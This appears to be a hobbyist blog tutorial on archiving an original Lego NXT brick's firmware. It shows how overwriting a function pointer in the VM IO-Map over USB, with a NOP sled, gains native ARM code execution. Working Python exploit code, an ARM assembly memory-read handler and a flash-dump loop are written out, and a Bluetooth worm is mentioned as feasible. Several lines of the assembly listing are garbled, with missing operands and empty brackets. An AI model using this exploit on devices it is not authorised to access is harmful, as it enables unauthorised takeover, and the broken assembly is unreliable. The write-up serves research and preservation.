I've recently been contributing to thePybricksproject, a community-run port of MicroPython to Lego Mindstorms hardware. As part of that, I obtained a usedLego NXTwhich just so happened to still be running the original version 1.01 firmware from when it launched in 2006. I wanted to archive a copy of this firmware, and doing so happened to involve the discovery of arbitrary code execution.

The NXT is a relatively simple exploitation target and can serve as a good introduction to ARM and embedded exploit development.

# Preliminary research

Or, in the words of a much more innocent era, "Google is your friend"(lol, not anymore, making research skills even more critical than they ever have been).

"Surely somebody must've already archived a copy of this firmware, right?" I thought to myself. Unfortunately, this does not appear to have been the case. I searched but never came across a copy of this particular firmware version despite the extensive NXT enthusiast community.

Ididcome acrossa mentionof a 1.03 firmware which appears to have been released on or very close to launch day. I suspect that enthusiasts and advanced users likely eagerly switched to newer and/or community-modified firmwares when they wanted newer features.

The NXT is also old enough that, despite being part of "the Internet era", resources are starting to bitrot.

Looks like I'm going to have to figure out how to retrieve a copy myself!

# Use the firmware updater?

The first idea which came to mind for backing up firmware is "does the tool which is used to download new firmware to the NXT also allow retrieving the preexisting firmware?"

From sources includingthe Wikipedia page, we find that the NXT is built around a Microchip (formerly Atmel)AT91SAM7S256microcontroller, a distant ancestor of the SAM D parts that now power several Arduino, MicroPython, and CircuitPython boards. This chip contains a built-in bootloader program called SAM-BA which supports simple "read from memory" (traditionally known asPEEK) and "write to memory" (traditionally known asPOKE) commands. This (deceptively!) seems like it'd work!

Fortunately, while researching, I found out thatsomebody did try this alreadyand wasunsuccessful. Attempting to enter the SAM-BA bootloader appears to automaticallyoverwritepart of the firmware which we want to back up. Good thing I did my research first! We have to find a different approach that doesn't involve entering firmware update mode.

# Use JTAG?

JTAG is a hardware interface used for providing all sorts of "debug" and "test" functionality for circuit boards and chips. Precisely what can be done using JTAG varies greatly, but the microcontroller in the NXT allows JTAG to read and modify all of the CPU's state for debugging. This can be used to read back data stored inside the chip.

Is this related to using JTAG to hack an Xbox or a mobile phone?

Yes! Those devices also use the same low-level protocol known as JTAG. However, the debug and test commands which can be usedon top ofJTAG are completely different. Think of JTAG as being similar to TCP or UDP while the chip-specific commands are higher-level protocols such as HTTP or SSH.

Unfortunately, since this is ahardwareinterface, using it involves taking apart the NXT and soldering to it (since the necessary connectors are not installed). Additionally, this chip is so old that its debug interface is cumbersome to set up and use (it doesn't supportSWD,ADIv5, or any of the interfaces and protocols that the cheap modern tools are designed for).

I considered this method a last resort but really wanted to find a software-only solution. Software-only solutions are generally easier to share and deploy, so finding one would allow many other people to also back up the firmware of bricks in their possession.

# Use a custom NXT program?

For a device like the NXT which already allows for limited user-programmability, the first instinct is usually to explore what this limited or "sandboxed" environment allows you to do. How do NXT programs work? Can we just write an NXT program that dumps the firmware and sends it to the computer?

If we hunt around, we canfindthe "LEGO MINDSTORMS NXT Executable File Specification" which explains that NXT programs run in a bytecodeVMand doesn't have the ability to read/write arbitrary memory. Variables are restricted to a "data segment" of fixed size, and all memory accesses must be inside it. This means that we cannot "just" write an NXT program (unless we find a bug in the VM which allows us to access memory we're not supposed to).

What is the difference between a VM and "native" code?

"Native" code refers to code which a CPU can directly run. Avirtual machineis a way of adding a layer of indirection between a program and the real CPU. Computer scientists love solving problems by adding indirection, and a virtual machine can be used to solve problems such as incompatibility, convenience, and/or security.

For example, a virtual machine can be used to take code designed for one type of CPU and run it on a different type of CPU. This is often called anemulator, and they can be useful when it isn't possible to recompile the code for the new CPU (such as if the original program is a closed-source video game for a proprietary game console but you want to run it on a desktop PC).

Java and .NET run on virtual machines which are specifically designed so that managing memory is more convenient (such as by having garbage collection). They can also be used to implement security by funneling "dangerous" operations into specific, limited pathways. The NXT's virtual machine is a virtual machine of this type.

# The NXT firmware

For those who aren't aware, the source code of the NXT firmware is publicly available! However, many links to it have bitrotted, source code only seems to have been released forsomeversions (certainly notevery), and it's not even clear which versions of the code have been archived and still exist. (For example, the seemingly-officialLEGO-Robotics/NXT-Firmwarerepository on GitHub... is actually a community-modified firmware! Its history also only contains versions 1.05 and 1.29 specifically and not, for example, the final 1.31 or the original 1.01.)

Nonetheless, we can stillstudy itto see if we can find anything interesting. At the same time, we can also study acopy of the NXT Bluetooth Developer Kitin order to understand how the computer communicates with the brick. (Despite being the "Bluetooth" developer kit, the documented protocol and commands are used over USB as well.)

## NXT communications protocol

From reading through the "LEGO MINDSTORMS NXT Communication Protocol" and "LEGO MINDSTORMS NXT Direct Commands" documents, we start to see the following high-level overview:

The protocol contains two categories of commands, "system" and "direct". System commands vaguely relate to "operating system" functionality, and direct commands vaguely relate to "actually operating a robot". In general, this protocolalsoseems to specificallynotallow performing arbitrary operations and badness such as accessing the firmware or getting native code execution outside of the VM. It appears to be designed to give friendly access toonlythe NXT's virtual filesystem and bytecode interpreter.

Since both the VM and the communications protocol appear to be designed to keep us out, it's starting to look like we're going to need to find some kind of exploit.

## IO-Maps

While looking through all of these documents, I generally focused my attention on "low-level" functionality, as it is much more likely to contain the ability to access the firmware and/or arbitrary memory. One feature, "IO-Maps", immediately stood out.

In the NXT Communication Protocol document, IO-Maps are described as "the well-described layer between the different controllers/drivers stack and the VM running the user's code." That sounds potentially interesting if it allows access to drivers in ways which aren't normally allowed. Also, if this is an interface which isn't normally used, it is a potential location for unexpected and exploitable bugs.

So... where does one find the so-called "well-described" description of what IO-Maps can do?

One of the best explanations I found wasan old copy of the NXC programmer's guide. NXC (Not eXactly C) is an alternative frontend for creating NXT programs for the stock firmware in a C-like language rather than graphical blocks. This programmer's guide lists all of the IO-Map offsets for each firmware module, and the explanations make it clear that IO-Maps contain essentially all of each module's internal state.

Further searching findsthisblog post explaining how it's possible to watch and plot variables in the user program by reading from the VM module's IO-Map. It definitely feels like we could be on to something here!

### IO-Maps in the firmware source code

How do you find the IO-Map structures in the firmware source code? That blog post lists astruct, but where is said struct?

It turns out that all IO-Maps are defined in.iomfiles in the firmware, with the VM's being defined inc_cmd.iom.

# Big fat exploit

Without even having to look at any other modules, we can already spot something: the VM IO-Map contains a function pointerpRCHandler! What does this function pointer do?

It turns out thatthis is the command handler for "direct" commands!

Is this... really just a native code function pointer sitting inside this IO-Map structure which is both readableandwritable over USB?

What is a function pointer? Why is finding a function pointer such a big deal?

A function pointer is a piece of data which stores the location of some code. A program uses this data to decide what code to run next. Programs themselves can modify function pointers in order to alter their functionality as they run, but, ifwecan modify the function pointer, we canalsoalter what the program does, including in ways that may be unintended.

## Scoping out the exploit

In order to try out whether this even has a chance of working, we will need to send commands to the NXT over USB. This can be done in many different ways, but here we will use thePythonprogramming language. Python is very suitable for testing and prototyping because it has aREPLand many third-party libraries implementing functionality that we can reuse. In this case, we will use thePyUSBlibrary to talk to the NXT.

Setting up Python, creating avirtualenv, installing PyUSB, installing USB drivers, and configuring USB permissions will all be left as an exercise for the reader. Thisisall very important, but "setting up and configuring a development environment" is ahugetask all on its own, requiringtonsof often-poorly-documented implicit knowledge, and I wanted to get this article done in a reasonable amount of time.

First we need to open a connection to the NXT:

>>>
 
import
 
usb.core

>>>
 
dev
 
=
 
usb
.
core
.
find
(
idVendor
=
0x0694
,
 
idProduct
=
0x0002
)

>>>
 
dev
.
set_configuration
()

Then we need to see if we can indeed access the VM (or "command") module's IO-Map:

>>>
 
dev
.
write
(
1
,
 
b
'
\x01\x94\x01\x00\x01\x00\x00\x00\x10\x00
'
)

10

>>>
 
bytes
(
dev
.
read
(
0x82
,
 
64
))

b
'
\x02\x94\x00\x01\x00\x01\x00\x10\x00
MindstormsNXT
\x00\x00\x00
'

Uhh... what?

Ah yes. Most people have not investedyearsinto skills such as staring at hex dumps and raw data. I'll have to give a more detailed explanation.

We want to send the "Read IO Map Command" to the NXT. This command is documented on page 20 of the "LEGO MINDSTORMS NXT Communication Protocol" document, and the request is documented to take 10 bytes. Here we're manually inputting each of the bytes using a hexadecimal escape sequence.

The first two bytes are required to be 0x01 and 0x94:\x01\x94.

This is followed by the module ID inlittle-endianformat:\x01\x00\x01\x00. This corresponds to a module ID of0x00010001which is the ID of the VM module.

What is little-endian?

When a value is stored using more than one byte, the bytes have to be stored in a particular order, just like how decimal numbers with multiple digits have to be written in a particular order. "Little-endian" is the "opposite" or "backwards" order from how Arabic numerals are written, meaning that the "first" or "leftmost" byte has the lowest place value. This byte is called the "LSB" or "least-significant byte". The "last" or "rightmost" byte has the highest place value and is called the "MSB" or "most-significant byte".

"Big-endian" is the opposite of little-endian and matches the order of Arabic numerals. The "endian" names are a historical artifact.

TL;DR it means you have to flip the bytes around

The next two bytes\x00\x00correspond to an offset of 0.

Finally, the last two bytes\x10\x00correspond to a length of 0x10 or 16.

In summary, this command means "read 16 bytes from offset 0 of the VM module's IO-Map".

To actually send the command to the NXT, we write it to USB endpoint 1. To read the response, we send a read command to USB endpoint0x82(don't worry about it).

But Iamworried about it!

Understanding this requires a minimal understanding of how the USB device framework works. An excellent overview can be foundhere. In short, when talking to a USB device, data needs to be sent to or received from specificendpoints. A device can have multiple endpoints of different types and directions. Each endpoint is identified by an address, which can be found in the USB descriptors. The NXT uses two "bulk" endpoints, one in each direction, and their addresses are0x01and0x82.

If we decode the response according to the documentation, we find that the first bytes\x02\x94are exactly as specified under the "return package" heading.

The next byte,\x00, means that the command succeeded.

This is followed by a repeat of the module ID\x01\x00\x01\x00and the requested length\x10\x00.

Finally, we have the data which was read:MindstormsNXT\x00\x00\x00. This data corresponds toFormatStringin the code, andhereit is initialized to theMindstormsNXTvalue that we see.

Let's try reading that function pointer now:

>>>
 
dev
.
write
(
1
,
 
b
'
\x01\x94\x01\x00\x01\x00\x10\x00\x04\x00
'
)

10

>>>
 
dev
.
read
(
0x82
,
 
64
)

array
(
'B'
,
 
[
2
,
 
148
,
 
0
,
 
1
,
 
0
,
 
1
,
 
0
,
 
4
,
 
0
,
 
61
,
 
13
,
 
16
,
 
0
])

>>>
 
hex
(
16
 
<<
 
16
 
|
 
13
 
<<
 
8
 
|
 
61
)

'0x100d3d'

It helps to see the difference if we line up the two commands:

# First test

>>>
 
dev
.
write
(
1
,
 
b
'
\x01\x94\x01\x00\x01\x00\x00\x00\x10\x00
'
)

# Second test

>>>
 
dev
.
write
(
1
,
 
b
'
\x01\x94\x01\x00\x01\x00\x10\x00\x04\x00
'
)

# Difference ^^ ^^

We've changed the offset from\x00\x00to\x10\x00(from 0 to 16). We've changed the length from\x10\x00to\x04\x00(from 16 to 4). (Remember that all the numbers are in little-endian!)

Instead of turning the response into abytesobject, we leave it as an array. In order to find the "actual data" which was read, we can either manually count all the bytes again, or we can realize that the data is going to be the last 4 bytes:[61, 13, 16, 0]. The final line of code converts this into the value of0x100d3d. This is our function pointer, but what does this number mean?

If we look atthe datasheet for the AT91SAM7S256 microcontrollerand look at Figure 8-1 "SAM7S512/256/128/64/321/32/161/16 Memory Mapping", we can see that memory addresses in the range0x001xxxxxcorrespond to the internal flash memory of the chip. The value that we read,0x100d3d, is0xd3dbytes or about 3 KiB past the beginning of the internal flash memory. This certainly looks like a reasonable function pointer! If we modify this function pointer, we should be able to redirect code execution for "direct" commands to something else.

## Gaining code execution

What, specifically, can we modify this pointertoin order to gain arbitrary code execution? On a modern system with memory protections and advanced exploit mitigations, this part of the puzzle may end up being a challenging task. However, this microcontroller has none of these features. We should be able to put inanyvalid address and have the microcontroller execute that address as code (as long as we've put valid code there).

How do you "put valid code somewhere"? What does that actually mean?

Many modern computers are designed so that the computer's instructions can be accessed and manipulated as data. Likewise, data can be treated as instructions. This is certainly the case for the microcontroller in question here. This idea iscritically important. It means that, as long as we can put somedatain some location, and as long as that data happens to represent valid instructions, the CPU will be able to execute it.

This is not the case on every system. For example, the AVR architecture does not treat instruction memory and data memory as interchangeable. Modern operating systems such as Windows or Android also typically prevent accessing data as instructions (often calledDEPorNX) without going through some extra steps. This helps protect against… exactly what we're doing here.

The fact that we have a simple target whichcanfreely interchange data and code and which doesn't have modern protections makes this an excellent learning target.

What addresses can we actually modify the function pointer to? We don't know what the code looks like (that's the whole point of this exercise!), and we don't know precisely how the data memory is laid out either. We can only put inoneaddress, so what do we do?

Here's where we get very lucky.

Inside the VM's IO-Map, there is aMemoryPoolvariable corresponding to the data segment of the running NXT program. This variable is32 KiBin size, which means that we have 32 KiB of space that we can safely fill with whatever we want (as long as no program is running).

"Safely"?

That means that the firmware will not crash if we modify or corrupt the memory pool, since it doesn't get accessed if no user program is running.

The NXT's microcontroller has a total of 64 KiB of RAM. Observe that 32 KiB ishalfof that total. If we assume that the firmware lays out RAM starting from the lowest address and going up, and that the firmware uses more than 0 bytes of RAM (both very reasonable assumptions), there isno possible locationthe firmware could put this memory pool that doesn't intersect with the address 32 KiB past the start of RAM,0x00208000.

Since we don't knowexactlywhere the buffer sits in RAM, we can fill the initial part of the buffer withnop(no operation) instructions. We put our exploit code at the very end of the buffer. As long as0x00208000isn'ttooclose to the end of the memory pool, it will end up pointing somewhere in the pile ofnops.

If we cause the CPU to jump to this address, the CPU will keep executing thenops until it finally hits our code. This exploitation technique is called a "NOP slide" or "NOP sled".

In order to test this out, we need to build a bunch of scaffolding:

This code invokes an ARM assembler to assemble code written innxtpwn.sinto binary data, fills most of theMemoryPoolwithnops, and then writes the assembled code at the end.

You will need to somehow install a copy of GCC and Binutils targeting ARM. Any reasonable version should do, but this is also part of "environment setup".

To test this, we can write the most basic assembly code innxtpwn.s:

bx
 
lr

This is an empty function which doesn't do anything. If we redirect the direct command handler to it, all direct commands should stop working.

How do you learn ARM assembly language?

I personally learned ARM assembly fromthis tutoriala long time ago. I generally think of "learning assembly" as consisting of at least two parts: learning howallCPUs work at a high level, and learning how one particular CPU architecture works.

For the first part, I started by learning x86 assembly in order to hack PC software. It's also possible to learn from "academic" computer science materials, including free curricula focused around the RISC-V architecture.Hereis an example of one I have found. It is also possible to learn this by doing retrocomputing for historical 8-bit computer systems, although those will have more differences from modern CPUs.

Given sufficient familiarity with the basics of CPUs, it's possible to study and understand documentation specific to ARM or another architecture. Looking at the output of a C compiler really helps to build familiarity and experience.

We can usepython3 -i nxtpwn.pyto load the exploit code before dropping us into the Python REPL.

Before we actually trigger the exploit, let's try running a "direct" command to make sure it works:

>>>
 
testbeep
()

b
'
\x02\x03\x00
'

This should make the NXT beep.

To trigger the exploit, we can enter the following:

>>>
 
iomap_w32
(
CMD_MODULE
,
 
CMD_OFF_FNPTR
,
 
0x00200000
 
+
 
32
*
1024
)

This replaces thatpRCHandlerfunction pointer with an address in RAM as described above. Now let's try to make the NXT beep again:

>>>
 
testbeep
()

b
'
\x02\x03\x00\x01\x00\x01\x00

This time the NXT doesn't beep (because we've replaced the function which handles direct commands with an empty function) and returns different (garbage) data (because our empty function doesn't set the output length properly either).

We have successfully achievednativeARM code execution on the NXT, on an unmodified firmware. This means that we are now free fromallof the restrictions the firmware normally imposes.

# Dumping firmware

Native code execution means we can access any data inside the microcontroller, including the firmware. To actually access it, we need to replace the direct command handler with a function which lets us read arbitrary memory addresses. The direct command handler turns out to be anexcellentlocation to hijack because it is already hooked up to all the infrastructure needed to communicate to and from the PC. This greatly simplifies the work we need to do.

In the firmware source code, we can see that theoriginal command handlernormally takes three arguments: the input buffer, the output buffer, and a pointer to the length of the output. According to the ARMABI, these values will be stored in CPU registersr0,r1, andr2respectively.

That function is written in C. How can you replace it with a function written in assembly? What is an ABI??

C code is turned into assembly code by acompiler. If we're not using a compiler, we can still write assembly code by hand.

When a C compiler turns code into assembly, it has to follow certain conventions in order for different parts of the program to work together properly. For example, code which needs to make a function call needs to agree with the function being called about where to put the function arguments. This information (as well as lots of other stuff we don't care about right now) is specified as part of the ABI.

Because the ARM architecture is aRISCarchitecture with comparatively "many" CPU registers, functions with 4 or fewer arguments ≤ 32 bits in size will have the arguments placed into registersr0-r3.

As long as our assembly code follows the same conventions as the C code (follows the ABI), the existing firmware can call our code with no problems.

We can replace the direct command handler with a function that reads from an arbitrary address that we give it:

# save r4

push
 
{
r4
}

# skip 2 bytes of packet

add
 
r0
,
 
#2

# load 4 bytes of the address

ldrb
 
r3
,
 
[
r0
]

add
 
r0
,
 
#1

ldrb
 
r4
,
 
[
r0
]

add
 
r0
,
 
#1

orr
 
r3
,
 
r4
,
 
lsl
 
#8

ldrb
 
r4
,
 
[

]

add
 
r0

orr

,

,
 
lsl
 
#16

ldrb
 
r4
,
 
[
r0
]

add
 
r0
,
 
#1

orr
 
r3
,
 
r4
,
 
lsl
 
#24

# read data from that address

ldr
 
r3
,
 
[
r3
]

# store 4 bytes of the resulting value

strb
 
r3
,
 
[
r1
]

add
 
r1
,
 
#1

lsr
 
r3
,
 
#8

strb
 
r3
,
 
[
r1
]

add
 
r1
,
 
#1

lsr
 
r3
,
 
#8

strb
 
r3
,
 
[
r1
]

add
 
r1
,
 
#1

lsr
 
r3
,
 
#8

strb
 
r3
,
 
[
r1
]

# store the output length of 4

mov
 
r3
,
 
#4

strb
 
r3
,
 
[
r2
]

# return success

mov
 
r0
,
 
#0

pop
 
{

}

Why do we need to saver4?

The ABI says so. ABIs typically designate that called functions can freely modify only certain registers. Called functions have to save and restore the others. This is a trade-off to try to reduce unnecessary saving and reloading of data which is no longer needed.

Now that we have this exploit code, we can now add some more code to the Python script in order to use it:

print
(
"sending pwn command"
)

iomap_w32
(
CMD_MODULE
,
 
CMD_OFF_FNPTR
,
 
0x00200000
 
+
 
32
*
1024
)

def
 
pwn_read
(
addr
):

 
cmd
 
=
 
struct
.
pack
(
"<BBI"
,
 
0
,
 
0xaa
,
 
addr
)

 
dev
.
write
(
1
,
 
cmd
)

 
result
 
=
 
bytes
(
dev
.
read
(
0x82
,
 
64
))

 
# print(result)

 
assert
 
result
[:
2
]
 
==
 
struct
.
pack
(
"<BB"
,
 
2
,
 
0xaa
)

 
result_val
 
=
 
struct
.
unpack
(
"<I"
,
 
result
[
2
:])[
0
]

 
return
 
result_val

This code sends a "direct" command with a dummy command byte of 0xaa (the firmware assumes this exists) followed by an address we want to read. The result contains the dummy command followed by 4 bytes of data. We can now try it out:

>>>
 
hex
(
pwn_read
(
0
))

'0xeafffffe'

>>>
 
hex
(
pwn_read
(
4
))

'0xeafffffe'

>>>
 
hex
(
pwn_read
(
8
))

'0xeafffffe'

>>>
 
hex
(
pwn_read
(
0xc
))

'0xeafffffe'

>>>
 
hex
(
pwn_read
(
0x10
))

'0xeafffffe'

>>>
 
hex
(
pwn_read
(
0x14
))

'0xeafffffe'

>>>
 
hex
(
pwn_read
(
0x18
))

'0xea000009'

>>>
 
hex
(
pwn_read
(
0x1c
))

'0xe1a09000'

>>>
 
hex
(
pwn_read
(
0x20
))

'0xe5980104'

This certainly looks like valid ARM code! (The leading0xeindicates an instruction which is always executed (in ARM, every instruction has an option to be conditionally executed only if certain flags are true), and0xeafffffeis an infinite loop.)

Why are you reading from address 0? Isn't that a null pointer?

This is a case where the abstractions of the C programming language start to break down. 0 is indeed a null pointer constant in C, but the hardware sees 0 as a memory address like any other. Some systems have nothing valid there, but some other systems (like this one) putexception vectorsat this location. When certain types of hardware interrupts or exceptions happen, the CPU jumps to certain fixed addresses around address 0 (the specific types of exceptions and the specific addresses are a property of the CPU architecture).

All we need to do now is to loop over 256 KiB starting at0x001xxxxxand save it to a file:

print
(
"reading flash..."
)

with
 
open
(
'nxtpwn-dump.bin'
,
 
'wb'
)
 
as
 
f
:

 
for
 
i
 
in
 
range
(
256
 
*
 
1024
 
//
 
4
):

 
addr
 
=
 
0x00100000
 
+
 
i
 
*
 
4

 
val
 
=
 
pwn_read
(
addr
)

 
f
.
write
(
struct
.
pack
(
"<I"
,
 
val
))

 
if
 
i
 
%
 
1024
 
==
 
0
:

 
print
(
f
"
\t
Done with 
{
(
i
 
//
 
1024
 
+
 
1
)
 
*
 
4
}
/256 KiB"
)

And with that, we have the firmware:

$
 
xxd
 
nxtpwn-dump.bin

Dumping the firmware in this manner also dumps all of the user programs and data stored on the brick, so I won't be releasing this until I clean it up a bit (so as to protect the privacy of the previous owner).

# What else?

Although I haven't tested it, this exploit likely works on all NXT firmwares derived from the stock firmware. This means that it was and is possible to runbare-metal code on the NXTwithout a modified firmware. This "just" requires somebody to write an appropriate program loader.

These commands can be triggered over Bluetooth, so I believe it's possible for paired NXTs to send them to each other. It should be possible to write an NXT worm (please don't write a malicious one).

If anybody is a skilled internet archivist, this is your chance to capture as many firmware versions as you can.

Happy hacking!
